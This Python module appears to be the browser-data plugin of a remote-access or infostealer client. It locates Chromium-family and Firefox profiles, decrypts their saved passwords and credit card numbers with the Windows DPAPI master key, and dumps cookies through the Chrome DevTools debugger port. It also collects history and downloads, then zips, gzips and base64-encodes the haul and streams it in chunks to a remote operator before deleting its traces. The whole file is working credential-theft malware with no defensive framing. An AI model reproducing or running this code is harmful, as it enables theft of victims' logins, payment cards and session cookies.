import os
import json
import shutil
import sqlite3
import base64
import zipfile
import requests
import random
import string
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import websocket
import io
import gzip
import traceback
from ..plugins.chunks import read_file_in_chunks, CHUNK_SIZE

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
    'firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
}

queries = {
    'logins': ('Login Data', 'SELECT action_url, username_value, password_value FROM logins'),
    'credit_cards': ('Web Data', 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards'),
    'history': ('History', 'SELECT url, title, last_visit_time FROM urls'),
    'downloads': ('History', 'SELECT tab_url, target_path FROM downloads')
}

def get_master_key(path):
    try:
        with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(buff, master_key):
    try:
        iv, data = buff[3:15], buff[15:]
        return AES.new(master_key, AES.MODE_GCM, iv).decrypt(data)[:-16].decode()
    except:
        return ''

def convert_time(timestamp):
    return (datetime(1601, 1, 1) + timedelta(microseconds=timestamp)).strftime('%Y-%m-%d %H:%M:%S')

def save_data(folder, browser, profile, filename, data):
    profile_folder = os.path.join(folder, browser, profile)
    os.makedirs(profile_folder, exist_ok=True)
    with open(os.path.join(profile_folder, filename), 'w', encoding='utf-8') as f:
        f.write(data)

def extract_firefox_data(path, folder):
    profiles = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]

    for profile in profiles:
        profile_path = os.path.join(path, profile)

        try:
            places_db = os.path.join(profile_path, 'places.sqlite')
            if os.path.exists(places_db):
                conn = sqlite3.connect(places_db)
                cursor = conn.cursor()
                cursor.execute('SELECT url, title, last_visit_date FROM moz_places')
                history_data = cursor.fetchall()
                history_data = ['\n'.join(map(str, row)) for row in history_data]
                save_data(folder, 'firefox', profile, 'history.txt', '\n'.join(history_data))
                conn.close()
        except:
            pass

        try:
            if os.path.exists(places_db):
                conn = sqlite3.connect(places_db)
                cursor = conn.cursor()
                cursor.execute('SELECT place_id, content FROM moz_annos WHERE anno_attribute_id = (SELECT id FROM moz_anno_attributes WHERE name = "downloads/destinationFileURI")')
                downloads_data = cursor.fetchall()
                downloads_data = ['\n'.join(map(str, row)) for row in downloads_data]
                save_data(folder, 'firefox', profile, 'downloads.txt', '\n'.join(downloads_data))
                conn.close()
        except:
            pass

        try:
            cookies_db = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_db):
                conn = sqlite3.connect(cookies_db)
                cursor = conn.cursor()
                cursor.execute('SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies')
                cookies_data = cursor.fetchall()

                formatted_cookies = []
                for cookie in cookies_data:
                    formatted_cookie = {
                        "domain": cookie[0],
                        "expirationDate": cookie[4] if cookie[4] else None,
                        "hostOnly": False,
                        "httpOnly": bool(cookie[6]),
                        "name": cookie[1],
                        "path": cookie[3],
                        "sameSite": "strict" if cookie[7] == 1 else "lax" if cookie[7] == 2 else "none",
                        "secure": bool(cookie[5]),
                        "session": False if cookie[4] else True,
                        "value": cookie[2]
                    }
                    formatted_cookies.append(formatted_cookie)

                save_data(folder, 'firefox', profile, 'cookies.json', json.dumps(formatted_cookies, indent=4))
                conn.close()
        except:
            pass

        try:
            logins_json = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_json):
                with open(logins_json, 'r', encoding='utf-8') as f:
                    logins_data = json.load(f)
                logins_data = ['\n'.join([login.get('hostname', ''), login.get('encryptedUsername', ''), login.get('encryptedPassword', '')]) for login in logins_data.get('logins', [])]
                save_data(folder, 'firefox', profile, 'logins.txt', '\n'.join(logins_data))
        except:
            pass

        try:
            formhistory_db = os.path.join(profile_path, 'formhistory.sqlite')
            if os.path.exists(formhistory_db):
                conn = sqlite3.connect(formhistory_db)
                cursor = conn.cursor()
                cursor.execute('SELECT fieldname, value FROM moz_formhistory WHERE fieldname LIKE "%cc-%"')
                credit_cards_data = cursor.fetchall()
                credit_cards_data = ['\n'.join(map(str, row)) for row in credit_cards_data]
                save_data(folder, 'firefox', profile, 'credit_cards.txt', '\n'.join(credit_cards_data))
                conn.close()
        except:
            pass

def extract_data(browser, path, master_key, folder):
    if browser == 'firefox':
        extract_firefox_data(path, folder)
        return

    profiles = [d for d in os.listdir(path) if os.path.exists(os.path.join(path, d, 'Login Data'))]

    for profile in profiles:
        for name, (db_file, query) in queries.items():
            db_path = os.path.join(path, profile, db_file)
            if not os.path.exists(db_path):
                continue

            temp_db = f'temp_{random_string(8)}.db'
            shutil.copy(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            data = []
            for row in cursor.execute(query).fetchall():
                row = list(row)
                if name in ['logins', 'credit_cards']:
                    row[-1] = decrypt_value(row[-1], master_key)
                if name == 'history':
                    row[-1] = convert_time(row[-1])
                data.append('\n'.join(f'{x}' for x in row) + '\n')

            conn.close()
            os.remove(temp_db)

            if data:
                save_data(folder, browser, profile, f'{name}.txt', '\n'.join(data))

        if browser == 'chrome':
            cookies = fetch_cookies_from_debugger()
            save_data(folder, browser, profile, 'cookies.txt', cookies)

def fetch_cookies_from_debugger():
    try:
        websocket_url = requests.get('http://localhost:9222/json').json()[0].get('webSocketDebuggerUrl')
        return get_cookies_via_devtools(websocket_url)
    except:
        return ''

def get_cookies_via_devtools(websocket_url):
    cookies_data = []

    def on_message(ws, message):
        nonlocal cookies_data
        data = json.loads(message)
        if 'result' in data and 'cookies' in data['result']:
            for cookie in data['result']['cookies']:
                cookies_data.append(f"{cookie['domain']}\t{cookie['name']}\t{cookie['value']}")
            ws.close()

    ws = websocket.WebSocketApp(websocket_url, on_message=on_message)
    ws.on_open = lambda ws: ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
    ws.run_forever()

    return '\n'.join(cookies_data)

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def zip_folder(folder):
    zip_filename = folder + '.zip'
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), folder))
    return zip_filename

def retrieve():
    output_folder = os.path.join(os.getenv('TEMP'), random_string(8))
    os.makedirs(output_folder, exist_ok=True)

    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue

        if browser == 'firefox':
            extract_firefox_data(path, output_folder)
            continue

        master_key = get_master_key(path)
        if not master_key:
            continue

        extract_data(browser, path, master_key, output_folder)
    
    if os.listdir(output_folder):
        zip_path = zip_folder(output_folder)
        return zip_path, output_folder
    
    return None, None

def retrieve_browser_data(self):
    try:
        zip_path, output_folder = retrieve()
        
        if zip_path:
            total_size = os.path.getsize(zip_path) if os.path.isfile(zip_path) else None
            file_name = os.path.basename(zip_path)

            with open(zip_path, "rb") as f:
                for chunk, is_last in read_file_in_chunks(f, CHUNK_SIZE):
                    buffer = io.BytesIO()
                    with gzip.GzipFile(fileobj=buffer, mode="wb") as gz:
                        gz.write(chunk)
                    
                    compressed_chunk = buffer.getvalue()
                    encoded_chunk = base64.b64encode(compressed_chunk).decode('utf-8')

                    data = {
                        'file_name': file_name,
                        'chunk': encoded_chunk,
                        'chunk_size': len(chunk),
                        'total_size': total_size,
                        'is_last': is_last,
                    }

                    if not self.send_message('download', self.converter.encode({"browser": data})):
                        break

        else:
            self.send_message('response', self.converter.encode({"browser_logger": f"From Client: Unable to retrieve browser data"}))

        try:
            shutil.rmtree(output_folder)
            os.remove(zip_path)
        except:
            pass

    except:
        self.send_message('response', self.converter.encode({"browser_logger": f"From Client: {traceback.format_exc()}"}))